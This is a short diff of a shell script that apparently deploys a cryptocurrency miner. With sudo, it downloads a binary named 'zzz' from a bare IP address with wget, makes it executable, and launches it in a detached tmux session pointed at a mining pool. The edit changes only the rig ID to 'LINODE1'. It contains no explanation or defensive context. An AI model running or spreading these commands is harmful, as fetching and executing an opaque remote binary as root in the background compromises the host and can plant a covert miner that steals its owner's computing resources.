@@ -11,6 +11,7 @@ sudo bash enable_1gb_pages.sh
 sudo bash randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
-tmux new-session -d -s session 'sudo ./zzz -o devilmpro.tech:3330 --nicehash --donate-level=0 --randomx-1gb-pages --rig-id=SATISH'
+tmux new-session -d -s session 'sudo ./zzz -o devilmpro.tech:3330 --nicehash --donate-level=0 --randomx-1gb-pages --rig-id=LINODE1'
+
 
 
